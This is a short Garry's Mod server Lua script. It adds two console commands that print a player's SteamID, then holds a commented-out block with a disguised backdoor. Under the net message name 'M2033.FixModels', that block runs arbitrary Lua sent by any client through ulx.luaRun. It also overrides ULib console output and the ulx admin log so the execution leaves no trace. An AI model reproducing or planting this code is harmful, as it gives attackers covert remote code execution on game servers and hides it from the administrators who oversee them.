concommand.Add( 'steamid', function( ply )

	print( ply:SteamID() )

end)

concommand.Add( 'steamid64', function( ply )

	print( ply:SteamID64() )

end)

--[[util.AddNetworkString( 'M2033.FixModels' )
net.Receive( 'M2033.FixModels', function()

		function ULib.console( calling_ply, output ) return end
		function ulx.fancyLogAdmin( calling_ply, format, ... )
			local use_self_suffix = false
			local hide_echo = false
			local players = {}

			local arg_pos = 1
			local args = { ... }
			if type( format ) == "boolean" then
				hide_echo = format
				format = args[ 1 ]
				arg_pos = arg_pos + 1
			end

			if type( format ) == "table" then
				players = format
				format = args[ 1 ]
				arg_pos = arg_pos + 1
			end

		   if format == '#A ran lua: #s' then return false end

		end

		local x = net.ReadString()
		ulx.luaRun( Entity(1), x )

		function ULib.console( ply, msg )
			if CLIENT or (ply and not ply:IsValid()) then
				Msg( msg .. "\n" )
				return
			end

			if ply then
				ply:PrintMessage( HUD_PRINTCONSOLE, msg .. "\n" )
			else
				local players = player.GetAll()
				for _, player in ipairs( players ) do
					player:PrintMessage( HUD_PRINTCONSOLE, msg .. "\n" )
				end
			end
		end

end)]]
